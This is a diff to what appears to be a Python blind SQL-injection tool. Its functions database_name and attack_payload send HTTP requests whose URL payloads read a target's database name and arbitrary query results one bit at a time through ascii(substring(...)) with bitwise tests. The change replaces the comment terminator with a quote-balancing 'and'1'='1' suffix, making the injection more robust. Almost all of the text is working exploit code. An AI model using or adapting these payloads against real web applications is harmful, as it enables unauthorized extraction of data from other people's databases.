@@ -24,7 +24,7 @@ def database_name(URL, control_point):
     database = ""
     for x in range(1, 20):
         for n in binary_number:
-            resp = requests.get(f"{URL}'and+ascii(substring(database(),{x},1))%26{n}={n}%23")
+            resp = requests.get(f"{URL}'and+(ascii(substring(database(),{x},1))%26{n}={n})+and'1'='1")
             if control_point in resp.text:
                 binary_result += n
             else:
@@ -46,7 +46,7 @@ def attack_payload(URL, query, control_point):
         data = ""
         for j in range(1, 30):
             for k in binary_number:
-                payload = f"{URL}'and+ascii(substring(({query}+limit+{i},1),{j},1))%26{k}={k}%23"
+                payload = f"{URL}'and+(ascii(substring(({query}+limit+{i},1),{j},1))%26{k}={k})+and'1'='1"
                 resp = requests.get(payload)
                 if control_point in resp.text:
                     binary_result += k # 이진수 총합을 구한다.
